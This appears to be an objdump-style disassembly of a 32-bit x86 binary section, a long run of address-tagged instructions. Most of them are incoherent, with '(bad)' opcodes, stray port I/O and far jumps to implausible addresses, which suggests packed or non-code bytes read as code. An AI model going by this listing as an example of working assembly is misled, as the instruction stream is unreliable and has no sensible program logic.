  408a62:	adc    eax,DWORD PTR [ebx]
  408a64:	inc    eax
  408a65:	or     ebp,DWORD PTR [eax+0x5b]
  408a68:	pop    ecx
  408a69:	sbb    eax,0xbc3a70bc
  408a6e:	in     al,dx
  408a6f:	fs mov eax,0xc942448a
  408a75:	cs pop esp
  408a77:	lea    eax,[edi+0x2e5ec66]
  408a7d:	xor    BYTE PTR [ecx+0x1b844e45],dh
  408a83:	aad    0x9
  408a85:	inc    ecx
  408a86:	jecxz  0x408ab3
  408a88:	push   edi
  408a89:	or     DWORD PTR [edi-0xcd4aad6],edi
  408a8f:	mov    al,0x5
  408a91:	dec    ebx
  408a92:	mov    eax,ds:0x57743336
  408a97:	mov    bh,0x95
  408a99:	repz (bad) 
  408a9b:	js     0x408a6e
  408a9d:	dec    edi
  408a9e:	jb     0x408ac1
  408aa0:	jg     0x408b08
  408aa2:	lock into 
  408aa4:	retf   
  408aa5:	sub    esi,eax
  408aa7:	or     ah,dh
  408aa9:	arpl   WORD PTR [edi-0x1a],sp
  408aac:	xchg   DWORD PTR es:[ecx],ecx
  408aaf:	aad    0xe0
  408ab1:	fst    QWORD PTR [eax+0x23b19935]
  408ab7:	pop    es
  408ab8:	call   0xadeb:0x7e851ded
  408abf:	popa   
  408ac0:	fidivr WORD PTR [esi+0x971b7a6]
  408ac6:	mov    ch,0x91
  408ac8:	shl    BYTE PTR [edi-0x2a9c537f],cl
  408ace:	mov    bl,0x60
  408ad0:	xchg   edi,eax
  408ad1:	das    
  408ad2:	out    0xe2,al
  408ad4:	and    ebx,eax
  408ad6:	xchg   ecx,esi
  408ad8:	(bad)
  408adc:	cmp    BYTE PTR [edi-0x50],cl
  408adf:	call   0xc4c1:0x241c304c
  408ae6:	icebp  
  408ae7:	in     al,dx
  408ae8:	sub    eax,0x9c7a23e9
  408aed:	clc    
  408aee:	mov    ebx,0x14028f3f
  408af3:	ins    DWORD PTR es:[edi],dx
  408af4:	popa   
  408af5:	xor    BYTE PTR [eax-0x46],cl
  408af8:	sbb    al,0x4d
  408afa:	mov    dl,0x41
  408afc:	pop    ebx
  408afd:	rcl    DWORD PTR [esi-0x3b8c6438],1
  408b03:	and    ah,ch
  408b05:	hlt    
  408b06:	rcr    cl,1
  408b08:	push   ecx
  408b09:	(bad)  
  408b0a:	dec    edx
  408b0b:	imul   ebx,ebx,0xfffffffc
  408b0e:	outs   dx,BYTE PTR ds:[esi]
  408b0f:	inc    ebx
  408b10:	shr    BYTE PTR [eax],cl
  408b12:	pop    esp
  408b13:	sub    DWORD PTR [edi],edx
  408b15:	jmp    0xd90c:0xe06cda29
  408b1c:	adc    BYTE PTR [edx],dh
  408b1e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408b1f:	std    
  408b20:	xchg   esi,eax
  408b21:	or     ecx,esp
  408b23:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408b24:	pop    ecx
  408b25:	push   eax
  408b26:	jle    0x408b08
  408b28:	add    al,0xfe
  408b2a:	pop    edi
  408b2b:	pop    esi
  408b2c:	and    ah,BYTE PTR [edi+0x3a]
  408b2f:	jge    0x408b76
  408b31:	add    eax,DWORD PTR [eax-0x665a8610]
  408b37:	test   DWORD PTR [esi-0x26],ebx
  408b3a:	mov    ebp,esp
  408b3c:	fwait
  408b3d:	mov    BYTE PTR [esi],dl
  408b3f:	pop    ebp
  408b40:	cmp    BYTE PTR [esi-0x8],0x41
  408b44:	add    al,0x5a
  408b46:	adc    DWORD PTR [edi+0x65],esp
  408b49:	and    al,0x88
  408b4b:	jp     0x408ae5
  408b4d:	jo     0x408b12
  408b4f:	jge    0x408bb1
  408b51:	inc    ecx
  408b52:	dec    edx
  408b53:	xor    DWORD PTR [edx+0x3e],ebx
  408b56:	mov    ch,0x39
  408b58:	mov    ebp,0x552e697d
  408b5d:	mov    dh,0x3b
  408b5f:	mov    ebp,0x43d74059
  408b64:	retf   
  408b65:	int3   
  408b66:	xchg   ebp,eax
  408b67:	ss jne 0x408b71
  408b6a:	xchg   BYTE PTR [ebx],dl
  408b6c:	inc    esi
  408b6d:	fnstcw WORD PTR [edx]
  408b6f:	test   al,0x11
  408b71:	or     eax,0xd32c19c5
  408b76:	stos   BYTE PTR es:[edi],al
  408b77:	or     DWORD PTR [edi+0x68],edx
  408b7a:	in     eax,0x13
  408b7c:	sar    BYTE PTR [esi-0x20],cl
  408b7f:	inc    eax
  408b80:	sbb    BYTE PTR [edi+ebx*1],dl
  408b83:	jnp    0x408b73
  408b85:	in     eax,0x35
  408b87:	icebp  
  408b88:	jnp    0x408bf9
  408b8a:	icebp  
  408b8b:	mov    ds:0x92bbd904,eax
  408b90:	fimul  DWORD PTR [esi-0x23]
  408b93:	cmp    ebp,DWORD PTR [eax-0x457921e]
  408b99:	push   ds
  408b9a:	rcr    BYTE PTR [edx+0x8411c43],cl
  408ba0:	dec    ebx
  408ba1:	out    0xa8,eax
  408ba3:	loopne 0x408beb
  408ba5:	sbb    DWORD PTR [ebx],edi
  408ba7:	imul   ebp,DWORD PTR [edx-0x479fe8b3],0x5d
  408bae:	sahf   
  408baf:	jmp    0xbee0f6ad
  408bb4:	or     eax,0xb90d0851
  408bb9:	cdq    
  408bba:	lods   eax,DWORD PTR ds:[esi]
  408bbb:	jno    0x408b51
  408bbd:	dec    eax
  408bbf:	xor    eax,0xf3b4936f
  408bc4:	xor    esi,DWORD PTR [eax]
  408bc6:	pop    ebx
  408bc7:	jge    0x408c2a
  408bc9:	hlt    
  408bca:	call   0x63858bdf
  408bcf:	shr    BYTE PTR [ebp-0x155f5d0e],1
  408bd5:	div    DWORD PTR [edx-0x14c37ae5]
  408bdb:	data16 loopne 0x408c20
  408bde:	mov    WORD PTR [edi-0x6b],es
  408be1:	shl    DWORD PTR [ebx-0x28],cl
  408be4:	add    bl,BYTE PTR [ebx+0x1a]
  408be7:	frstor [esi+0x61c0cbf3]
  408bed:	sbb    esp,ebx
  408bef:	addr16 shl edx,cl
  408bf2:	into   
  408bf3:	sub    edx,DWORD PTR [edx-0x22]
  408bf6:	retf   0x7c16
  408bf9:	mov    cl,0x82
  408bfb:	daa    
  408bfc:	xchg   BYTE PTR [ebx+0xd],bh
  408bff:	or     bl,dl
  408c01:	mov    cl,0xa
  408c03:	jmp    0x60ec:0xafed2875
  408c0a:	sub    al,0xd1
  408c0c:	sar    ah,0xe4
  408c0f:	sub    eax,eax
  408c11:	outs   dx,BYTE PTR ds:[esi]
  408c12:	fisub  WORD PTR [eax]
  408c15:	lods   eax,DWORD PTR ds:[esi]
  408c16:	arpl   WORD PTR [esi+edi*2+0x4172c195],di
  408c1d:	retf   
  408c1e:	push   es
  408c1f:	sub    ah,BYTE PTR [eax+0x60]
  408c22:	push   edx
  408c23:	pop    ebp
  408c24:	xchg   DWORD PTR [esp+esi*4+0x57625788],ebx
  408c2b:	mov    ah,0xe2
  408c2d:	ins    BYTE PTR es:[edi],dx
  408c2e:	pop    eax
  408c2f:	jns    0x408c3c
  408c31:	mov    ds:0xe27a3d7b,al
  408c36:	ja     0x408bd7
  408c38:	rol    ebx,0xec
  408c3b:	push   es
  408c3c:	(bad)  
  408c3d:	std    
  408c3e:	or     eax,ecx
  408c40:	jbe    0x408cbc
  408c42:	nop    DWORD PTR [edx+0x4959a38f]
  408c49:	xchg   ecx,edx
  408c4b:	dec    BYTE PTR [edx]
  408c4d:	push   DWORD PTR [ebp-0x10]
  408c50:	mov    eax,ds:0x41b264
  408c55:	mov    eax,DWORD PTR [eax]
  408c57:	push   DWORD PTR [eax]
  408c59:	lea    eax,ds:0x41b280
  408c5f:	jmp    0x408fac
  408c64:	mov    ebx,0x93838448
  408c69:	push   ebx
  408c6a:	mov    ebx,0x78da0248
  408c6f:	bound  ecx,QWORD PTR [ebp+edx*8-0x26b8ce86]
  408c76:	jo     0x408ce8
  408c78:	and    BYTE PTR [ebp+0x70],bh
  408c7b:	jo     0x408c52
  408c7d:	sahf   
  408c7e:	sbb    eax,0xff59fc1e
  408c83:	jp     0x408c8b
  408c85:	pop    es
  408c86:	jnp    0x408c61
  408c88:	adc    DWORD PTR [ebx+esi*4],eax
  408c8b:	xchg   ebx,eax
  408c8c:	hlt    
  408c8d:	xor    ch,BYTE PTR [edx]
  408c8f:	jmp    0x2162:0x66c2e946
  408c96:	loopne 0x408d14
  408c98:	test   eax,0xa8bd8a0c
  408c9d:	dec    ecx
  408c9e:	repz sub esp,DWORD PTR [edi+edx*2-0x1b58d826]
  408ca6:	dec    edi
  408ca7:	dec    eax
  408ca8:	push   ss
  408ca9:	xor    al,0x5
  408cab:	sar    BYTE PTR [edi],1
  408cad:	test   bh,bh
  408caf:	nop
  408cb0:	mov    dl,ah
  408cb2:	mov    esp,0x3686ef0a
  408cb7:	out    dx,al
  408cb8:	popf   
  408cb9:	adc    bh,al
  408cbb:	and    eax,0x1aa8b1f4
  408cc0:	pop    ebp
  408cc1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408cc2:	stc    
  408cc3:	sub    DWORD PTR [esi+ebp*8],0x50f46984
  408cca:	(bad)  
  408ccb:	cmp    BYTE PTR [ebp+ebx*4+0x11],ch
  408ccf:	add    eax,0xf821d4d2
  408cd4:	xchg   esp,eax
  408cd5:	xlat   BYTE PTR ds:[ebx]
  408cd6:	jecxz  0x408d3f
  408cd8:	pop    ebx
  408cd9:	dec    esp
  408cda:	pop    ebx
  408cdb:	lods   al,BYTE PTR ds:[esi]
  408cdc:	(bad)  
  408cdd:	shl    BYTE PTR [esi-0x26],1
  408ce0:	jmp    0x408d4e
  408ce2:	pusha  
  408ce3:	sahf   
  408ce4:	cmp    DWORD PTR [ebx-0x26],0x4d960dcf
  408ceb:	sub    eax,0x906bd598
  408cf0:	pusha  
  408cf1:	push   ds
  408cf2:	cmp    DWORD PTR [edx+0xf9326b4],ecx
  408cf8:	in     al,0x33
  408cfa:	fdivr  DWORD PTR [ecx-0x74c5f891]
  408d00:	call   0xae05:0x1048a78f
  408d07:	outs   dx,BYTE PTR ds:[esi]
  408d08:	loop   0x408cb3
  408d0a:	out    0xbd,al
  408d0c:	mov    ebx,0x58695ccd
  408d11:	adc    BYTE PTR [esi+0x6eb44fb7],ah
  408d17:	jo     0x408d7d
  408d19:	hlt    
  408d1a:	pop    esp
  408d1b:	imul   edx,DWORD PTR [edi],0x57
  408d1e:	fcmovu st,st(4)
  408d20:	js     0x408cc2
  408d22:	xchg   bl,al
  408d24:	xchg   esp,eax
  408d25:	retf   
  408d26:	sub    ah,BYTE PTR [edi-0x59cd7413]
  408d2c:	sub    DWORD PTR [ecx],0xfffffff4
  408d2f:	inc    edx
  408d30:	das    
  408d31:	dec    esp
  408d32:	dec    esp
  408d33:	add    al,BYTE PTR [edx-0x69]
  408d36:	pushf  
  408d37:	mov    edx,0xb63a5b4a
  408d3c:	fwait
  408d3d:	in     eax,dx
  408d3e:	sahf   
  408d3f:	sbb    al,0x88
  408d42:	jmp    0x4f11:0x1e617eff
  408d49:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408d4a:	sub    DWORD PTR [ebx],0xffffffb1
  408d4d:	fwait
  408d4e:	(bad)  
  408d4f:	(bad)  
  408d50:	(bad)  
  408d51:	jge    0x408d1d
  408d53:	cmp    ebp,DWORD PTR [esi+0x4af9a99b]
  408d59:	bound  edi,QWORD PTR [esi-0x729f4c17]
  408d5f:	sbb    DWORD PTR [eax+0x36c0225d],ecx
  408d65:	in     al,dx
  408d66:	imul   edx,DWORD PTR [edi-0x24],0x30
  408d6a:	sub    al,0xeb
  408d6c:	icebp  
  408d6d:	stos   BYTE PTR es:[edi],al
  408d6e:	retf   0x38d
  408d71:	push   0x1544a37
  408d76:	inc    cx
  408d78:	or     bl,BYTE PTR [ecx]
  408d7a:	push   eax
  408d7b:	jmp    0x9996ae15
  408d80:	cmc    
  408d81:	mov    eax,0x714de631
  408d86:	mov    ah,0x96
  408d88:	xchg   edi,eax
  408d89:	dec    ebp
  408d8a:	rol    BYTE PTR [eax],0xbb
  408d8d:	mov    ds:0xcab1dcd0,al
  408d92:	push   ecx
  408d93:	lods   al,BYTE PTR ds:[esi]
  408d94:	bnd gs jg 0x408dac
  408d98:	test   DWORD PTR [ebx+0x4a93a44a],ecx
  408d9e:	ret    
  408d9f:	push   ebx
  408da0:	fnstsw WORD PTR [edi+eax*8+0x5428a58d]
  408da7:	push   eax
  408da8:	mov    al,0x8f
  408daa:	xlat   BYTE PTR ds:[ebx]
  408dab:	sbb    BYTE PTR [esi+0x532cfaca],ah
  408db1:	fcom   st(6)
  408db3:	(bad)  
  408db4:	jge    0x408e06
  408db6:	and    dl,al
  408db8:	xor    eax,0x72bbeb71
  408dbd:	sub    eax,0x54de8a01
  408dc2:	cwde   
  408dc3:	push   edx
  408dc4:	ret    0x455a
  408dc7:	mov    eax,0xaf044a4d
  408dcc:	jle    0x408dca
  408dce:	ret    0xbda4
  408dd1:	or     ebp,DWORD PTR [ebx-0x6955bda3]
  408dd7:	pushf  
  408dd8:	lea    eax,[edi+edi*2-0x474f86be]
  408ddf:	mov    WORD PTR [eax-0x59543351],gs
  408de5:	or     edx,DWORD PTR [edx+0x41]
  408de8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408de9:	lds    ebp,FWORD PTR [edx-0x37]
  408dec:	arpl   WORD PTR [eax+eiz*4],ax
  408def:	outs   dx,DWORD PTR ds:[esi]
  408df0:	popf   
  408df1:	mov    eax,esi
  408df3:	xor    bh,BYTE PTR [ecx-0x20]
  408df6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408df7:	sub    eax,0x2fc501b3
  408dfc:	push   ss
  408dfd:	cmc    
  408dfe:	icebp  
  408dff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408e00:	inc    esi
  408e01:	push   esp
  408e02:	sbb    al,0x9e
  408e04:	xchg   esi,eax
  408e05:	shl    ah,1
  408e07:	ja     0x408e34
  408e09:	outs   dx,DWORD PTR ds:[esi]
  408e0a:	shl    BYTE PTR ds:0x4db36aa3,1
  408e10:	or     al,0x9e
  408e12:	inc    esp
  408e13:	mov    WORD PTR ds:0xadedbd28,cs
  408e19:	dec    edi
  408e1a:	out    dx,al
  408e1b:	mov    WORD PTR [ecx+0xd7ec928],cs
  408e21:	pusha  
  408e22:	jnp    0x408e75
  408e24:	test   DWORD PTR gs:[bp-0x29],0x96cbb9d0
  408e2d:	cmp    BYTE PTR [ebx-0x2a],bh
  408e30:	iret   
  408e31:	ficomp DWORD PTR [esi]
  408e33:	inc    ebp
  408e34:	cld    
  408e35:	in     eax,dx
  408e36:	cli    
  408e37:	test   DWORD PTR ds:0xefc84b5b,ebp
  408e3d:	mov    ds:0xfa7b5749,al
  408e42:	and    esp,DWORD PTR [edx-0x24]
  408e45:	jns    0x408e1b
  408e47:	into   
  408e48:	repnz sub esi,DWORD PTR [edi+0x52f4c153]
  408e4f:	mov    esp,0xfe109586
  408e54:	out    0x95,eax
  408e56:	pand   mm5,QWORD PTR [edi]
  408e59:	mov    edi,0xcf746765
  408e5e:	push   ds
  408e5f:	and    BYTE PTR [ebp+0x53],dh
  408e62:	ret    0x4fb2
  408e65:	push   esp
  408e66:	jae    0x408e1c
  408e68:	mov    bl,0x45
  408e6a:	xor    dh,BYTE PTR [esi-0x8]
  408e6d:	out    0x3b,eax
  408e6f:	inc    edx
  408e70:	pop    esi
  408e71:	int    0xcd
  408e73:	inc    ebx
  408e74:	(bad)  
  408e75:	cmc    
  408e76:	add    esp,edi
  408e78:	ret    
  408e79:	fnstcw WORD PTR ds:0x2d72b2fc
  408e7f:	(bad)  
  408e80:	push   esi
  408e81:	pop    edx
  408e82:	mov    bh,0x56
  408e84:	into   
  408e85:	loop   0x408ea2
  408e87:	sub    al,BYTE PTR [eax+0x5ab492d5]
  408e8d:	or     eax,0x8057cbd8
  408e92:	mov    ebx,0x9033414a
  408e97:	and    DWORD PTR gs:[bp+si-0x3742],edx
  408e9d:	frstor [ecx+eax*4-0x51f55af1]
  408ea4:	dec    ebp
  408ea5:	in     eax,0x8a
  408ea7:	lock adc eax,0x5aceb326
  408ead:	bound  ebx,QWORD PTR gs:[ebp-0x7e]
  408eb1:	push   ebp
  408eb2:	fs jg  0x408ee7
  408eb5:	lds    esp,FWORD PTR [esi+0x48]
  408eb8:	adc    al,0x75
  408eba:	xchg   edx,eax
  408ebb:	(bad)  
  408ebc:	sti    
  408ebd:	(bad)  
  408ebe:	push   cs
  408ebf:	lods   eax,DWORD PTR ds:[esi]
  408ec0:	dec    esp
  408ec1:	pop    ebp
  408ec2:	adc    al,0xb0
  408ec4:	(bad)  
  408ec5:	mov    dh,0x70
  408ec7:	fwait
  408ec8:	pop    edx
  408ec9:	adc    DWORD PTR [eax+0x2f706892],0x6216b6d7
  408ed3:	out    dx,al
  408ed4:	or     cl,0xe6
  408ed7:	loop   0x408eee
  408ed9:	xlat   BYTE PTR ds:[ebx]
  408eda:	call   0x81c84078
  408edf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408ee0:	imul   edi,edi,0xfdd076ff
  408ee6:	mov    bl,0xf
  408ee8:	or     eax,0x5e59471
  408eed:	xchg   esp,eax
  408eee:	lods   eax,DWORD PTR ds:[esi]
  408eef:	inc    eax
  408ef0:	sbb    al,bh
  408ef2:	(bad)  
  408ef3:	mov    al,ds:0x2bb96ef6
  408ef8:	inc    edx
  408ef9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408efa:	fnsetpm(287 only) 
  408efc:	int    0x7a
  408efe:	adc    DWORD PTR [esi+ebx*8],0xd4e92024
  408f05:	(bad)  
  408f06:	and    esp,DWORD PTR [edi]
  408f08:	cmc    
  408f09:	jns    0x408f3b
  408f0b:	bound  esi,QWORD PTR [esi+0x695468f4]
  408f11:	pop    esp
  408f12:	frstor [ebp-0x41a44b26]
  408f18:	imul   eax,DWORD PTR [ebx-0x39],0x948856b0
  408f1f:	(bad)  
  408f20:	cmp    ebp,DWORD PTR [eax]
  408f22:	lds    eax,FWORD PTR [edx+0x3a96dd99]
  408f28:	dec    esp
  408f29:	icebp  
  408f2a:	lods   al,BYTE PTR ds:[esi]
  408f2b:	sbb    bh,BYTE PTR [edi+0xa]
  408f2e:	(bad)  
  408f2f:	xchg   esp,eax
  408f30:	lods   eax,DWORD PTR ds:[esi]
  408f31:	inc    eax
  408f32:	mov    ebx,0x4d446b9c
  408f37:	xchg   edx,esi
  408f39:	add    esp,ebp
  408f3b:	jmp    0x2d54bd01
  408f40:	mov    ah,0x4a
  408f42:	arpl   sp,si
  408f44:	call   0x3166f33c
  408f49:	gs jne 0x408f26
  408f4c:	in     al,dx
  408f4d:	fild   QWORD PTR [ebx-0x26]
  408f50:	shl    BYTE PTR [edx+0x41e19d0],cl
  408f56:	push   ds
  408f57:	pop    ds
  408f58:	adc    DWORD PTR [esi-0x7de1d831],eax
  408f5e:	mov    dh,ah
  408f60:	or     al,0x2c
  408f62:	aas    
  408f63:	in     al,0x19
  408f65:	mov    edx,0x940d638
  408f6a:	stc    
  408f6b:	xchg   ebx,eax
  408f6c:	sahf   
  408f6d:	dec    ecx
  408f6e:	retf   0x962b
  408f71:	ins    BYTE PTR es:[edi],dx
  408f72:	sti    
  408f73:	mov    edi,0x2d724d81
  408f78:	outs   dx,DWORD PTR ds:[esi]
  408f79:	aam    0x31
  408f7b:	xchg   ebp,eax
  408f7c:	cmp    al,0x76
  408f7e:	cmp    dl,BYTE PTR [edi-0x474d6e47]
  408f84:	jg     0x408f14
  408f86:	dec    edx
  408f87:	cwde   
  408f88:	daa    
  408f89:	adc    BYTE PTR [esi],0x8f
  408f8c:	inc    edx
  408f8d:	xor    al,0x67
  408f8f:	xchg   ebp,eax
  408f90:	pop    esp
  408f91:	xchg   BYTE PTR [ecx],cl
  408f93:	pop    ecx
  408f94:	out    0x41,al
  408f96:	outs   dx,BYTE PTR ds:[esi]
  408f97:	adc    al,0x44
  408f99:	xchg   edx,eax
  408f9a:	cmp    dl,BYTE PTR [ebx-0x6e53eb83]
  408fa0:	cmp    DWORD PTR [esi],ecx
  408fa2:	xchg   ecx,eax
  408fa3:	adc    esi,DWORD PTR [edi-0xf2f5ee1]
  408fa9:	add    BYTE PTR [eax-0x72cf0040],bl
  408faf:	add    eax,0x41b02c
  408fb4:	jmp    0x409301
  408fb9:	add    al,0x7c
  408fbb:	out    0xcb,eax
  408fbd:	out    0xf3,eax
  408fbf:	xor    al,0xd3
  408fc1:	call   0x2e1937f3
  408fc6:	ficom  WORD PTR [ebp+0x15]
  408fc9:	ja     0x408fb1
  408fcb:	jo     0x40903d
  408fcd:	and    BYTE PTR [ebp+0x70],bh
  408fd0:	jo     0x409013
  408fd2:	mov    ebp,0xebb11d99
  408fd7:	dec    edi
  408fd8:	retf   0x3d9a
  408fdb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408fdc:	scas   eax,DWORD PTR es:[edi]
  408fdd:	xchg   ecx,eax
  408fde:	lea    eax,[ebx+edx*8+0x3db9ea2d]
  408fe5:	sub    edx,DWORD PTR [edx-0x775363d8]
  408feb:	jp     0x408f89
  408fed:	xor    edx,DWORD PTR [esi]
  408fef:	and    DWORD PTR [edx-0x1e],ebx
  408ff2:	jmp    FWORD PTR [eiz*8-0x3f7c8933]
  408ff9:	xchg   ecx,eax
  408ffa:	and    BYTE PTR [esp+eax*2-0x10],cl
  408ffe:	mov    ch,0x85
  409000:	ds inc ebp
  409002:	mov    ecx,DWORD PTR [ebp+0x74a6f5a0]
  409008:	fiadd  WORD PTR [edi]
  40900a:	or     eax,DWORD PTR [eax-0x2c1f8746]
  409010:	jmp    0x34d3d15
  409015:	jmp    0x408fe8
  409017:	and    DWORD PTR [ebp+ebp*1+0x5572d50d],edx
  40901e:	jns    0x409071
  409020:	mov    dh,0x6d
  409022:	jmp    0x34b1c5a5
  409027:	test   eax,0x7e227603
  40902c:	pop    ds
  40902d:	mov    eax,ds:0x9f212d6f
  409032:	inc    ecx
  409033:	aas    
  409034:	inc    edx
  409035:	push   esi
  409036:	sub    eax,0x1e050445
  40903b:	xor    dh,ch
  40903d:	add    cl,ch
  40903f:	lods   eax,DWORD PTR ds:[esi]
  409040:	ror    BYTE PTR [edi-0x50c5a772],1
  409046:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409047:	push   edi
  409048:	mov    ch,0xf6
  40904a:	xlat   BYTE PTR ds:[ebx]
  40904b:	sub    esi,ebx
  40904d:	loop   0x409038
  40904f:	les    ecx,FWORD PTR [edi+0x55]
  409052:	mov    WORD PTR [edx-0x30],ss
  409055:	in     eax,0x9d
  409057:	(bad)  
  409058:	push   0xc2363e3e
  40905d:	pop    es
  40905e:	xchg   esi,eax
  40905f:	sub    ebp,DWORD PTR [ebp+0x3e]
  409062:	aam    0x13
  409064:	mov    ecx,0x82feef3a
  409069:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40906a:	inc    edi
  40906b:	mov    edx,0xe4b77363
  409070:	icebp  
  409071:	ins    DWORD PTR es:[edi],dx
  409072:	mov    dl,0x9e
  409074:	sbb    dh,bl
  409076:	xor    bh,BYTE PTR [eax]
  409078:	leave  
  409079:	fidiv  DWORD PTR [esi+0x7cced31f]
  40907f:	pop    esi
  409080:	out    0x8e,al
  409082:	dec    ecx
  409083:	jne    0x40906a
  409085:	out    dx,al
  409086:	lahf   
  409087:	adc    BYTE PTR [edi+0x42],ch
  40908a:	and    bh,bl
  40908c:	sar    BYTE PTR [esi-0x7c],1
  40908f:	add    eax,0x7cb3eef5
  409094:	stos   DWORD PTR es:[edi],eax
  409095:	add    DWORD PTR [edx-0x1a],ebp
  409098:	cmp    eax,DWORD PTR [eax]
  40909a:	add    eax,0xa3e04064
  40909f:	adc    edx,DWORD PTR [esi+0x78]
  4090a2:	fwait
  4090a3:	mov    eax,ds:0xc3f2cfed
  4090a8:	fidivr WORD PTR [edi]
  4090aa:	repz mov ebx,ecx
  4090ad:	jno    0x4090cb
  4090af:	out    dx,al
  4090b0:	cmp    BYTE PTR [edx+0x3c2b509f],0xa3
  4090b7:	cmp    esp,edi
  4090b9:	mov    WORD PTR [ebp-0x5f6d2200],?
  4090bf:	inc    esp
  4090c0:	repnz mov dh,0x18
  4090c3:	in     eax,dx
  4090c4:	and    dh,cl
  4090c6:	inc    esp
  4090c7:	sub    al,0x3
  4090c9:	mov    edi,0x7afee773
  4090ce:	fiadd  DWORD PTR [ecx+esi*2-0x17]
  4090d2:	add    eax,0x8ff379
  4090d7:	std    
  4090d8:	cs push esi
  4090da:	sbb    bh,BYTE PTR [ecx]
  4090dc:	pusha  
  4090dd:	jle    0x4090bf
  4090df:	cdq    
  4090e0:	adc    bl,ah
  4090e2:	int3   
  4090e3:	add    al,0xa0
  4090e5:	mov    ebp,DWORD PTR [eax+0x39877746]
  4090eb:	mov    bl,0xc0
  4090ed:	sbb    BYTE PTR [ebx],ah
  4090ef:	sub    esp,DWORD PTR [ecx+eiz*2+0x5d4eb28]
  4090f6:	(bad)
  4090fa:	or     eax,0x66b33404
  4090ff:	(bad)  
  409100:	mov    ds:0x67547849,eax
  409105:	imul   ebp,DWORD PTR [eax+ebp*2],0x92d9af20
  40910c:	in     al,0x64
  40910e:	xchg   esp,eax
  40910f:	(bad)
  409114:	xchg   ecx,eax
  409115:	mov    cl,0x63
  409117:	cmp    cl,al
  409119:	mov    ebx,0x9d9a60a2
  40911e:	lahf   
  40911f:	sbb    al,0x48
  409121:	mov    edi,0xf0707b7c
  409126:	outs   dx,DWORD PTR ds:[esi]
  409127:	jle    0x409176
  409129:	rep lods al,BYTE PTR ds:[esi]
  40912b:	call   0x623f:0x73157676
  409132:	add    eax,0xed3c8d34
  409137:	inc    esp
  409138:	stos   BYTE PTR es:[edi],al
  409139:	inc    ebp
  40913a:	out    0x5e,al
  40913c:	aas    
  40913d:	or     bh,BYTE PTR [ebx+edx*1+0x9]
  409141:	int    0x71
  409143:	mov    esp,0x21473fc
  409148:	push   DWORD PTR [edx+0x48cb22a6]
  40914e:	enter  0xa4db,0x38
  409152:	icebp  
  409153:	pop    ebp
  409154:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409155:	cmp    cl,dh
  409157:	xor    eax,DWORD PTR [edx-0x2f9ec3f7]
  40915d:	cs xchg ecx,eax
  40915f:	ins    BYTE PTR es:[edi],dx
  409160:	add    BYTE PTR [edi+0x21be2c57],dh
  409166:	mov    edx,0x1f1fef72
  40916b:	and    al,0x42
  40916d:	xchg   esp,eax
  40916e:	xor    ebp,DWORD PTR [edx]
  409170:	imul   edx,DWORD PTR [eax],0x25
  409173:	xor    BYTE PTR [eax-0x6c],dh
  409176:	cmp    al,0x8a
  409178:	repz xlat BYTE PTR ds:[ebx]
  40917a:	pop    ebx
  40917b:	(bad)  
  40917c:	jmp    0xee333f11
  409181:	cmp    DWORD PTR [ebp+0x62eb6ec5],edx
  409187:	inc    ebp
  409188:	in     eax,0xa7
  40918a:	outs   dx,DWORD PTR ds:[esi]
  40918b:	sbb    esi,0x1b3edab5
  409191:	cs mov ch,0xc4
  409194:	scas   eax,DWORD PTR es:[edi]
  409195:	jmp    0x4091d6
  409197:	dec    edi
  409198:	mov    edx,0x256a31fd
  40919d:	sbb    ebx,DWORD PTR [ecx+0xc]
  4091a0:	iret   
  4091a1:	xor    BYTE PTR [esi+0x269bf611],ah
  4091a7:	cmp    BYTE PTR [ecx],ah
  4091a9:	adc    al,0xb2
  4091ab:	mov    cl,0x67
  4091ad:	inc    ecx
  4091ae:	sbb    ch,BYTE PTR [ebp+edi*4+0x5d]
  4091b2:	fmul   st(4),st
  4091b4:	rcl    DWORD PTR [eax-0x79f73614],0xd8
  4091bb:	jp     0x409227
  4091bd:	mov    ss,WORD PTR [edx+eiz*8]
  4091c0:	jge    0x40922f
  4091c2:	jl     0x40915a
  4091c4:	test   BYTE PTR [edi-0x499c069d],0xbb
  4091cb:	mov    bl,0x4f
  4091cd:	(bad)  
  4091cf:	sti    
  4091d0:	sbb    edx,DWORD PTR [ebp-0x1a2dace9]
  4091d6:	push   esp
  4091d7:	rcl    DWORD PTR [ebp+0x57],cl
  4091da:	and    eax,0xcdabbaad
  4091df:	test   BYTE PTR ds:0x470cd09c,ah
  4091e5:	mov    ecx,0x47e9cf1d
  4091ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4091eb:	ss test edx,eax
  4091ee:	add    DWORD PTR [edx+0x1],edi
  4091f1:	daa    
  4091f2:	and    cl,BYTE PTR [eax]
  4091f4:	popa   
  4091f5:	and    ah,BYTE PTR [eax+0x10]
  4091f8:	int    0x6c
  4091fa:	repz btc DWORD PTR [esi-0x5b],ebp
  4091ff:	push   0xfffffffc
  409201:	mov    dl,0x2a
  409203:	push   0xffffffae
  409205:	or     DWORD PTR [eax-0x47924b43],0xffffffe4
  40920c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40920d:	mov    dl,0x37
  40920f:	call   0x5c6c7fb6
  409214:	dec    ebp
  409215:	leave  
  409216:	push   esp
  409217:	push   ecx
  409218:	xchg   ebp,eax
  409219:	mov    edx,0x88dda33e
  40921e:	es xchg esi,eax
  409220:	xchg   esi,eax
  409221:	rol    DWORD PTR ds:0xffaf9230,1
  409227:	push   ebp
  409228:	lds    ecx,FWORD PTR [edi+0x6804d051]
  40922e:	data16 aam 0xc2
  409231:	or     BYTE PTR [esi-0x43ab619],cl
  409237:	fs addr16 dec eax
  40923a:	mov    eax,0x29157fd0
  40923f:	push   es
  409240:	(bad)  
  409241:	in     al,dx
  409242:	xor    eax,0x10ce8632
  409247:	mov    ds:0x486c1cf5,eax
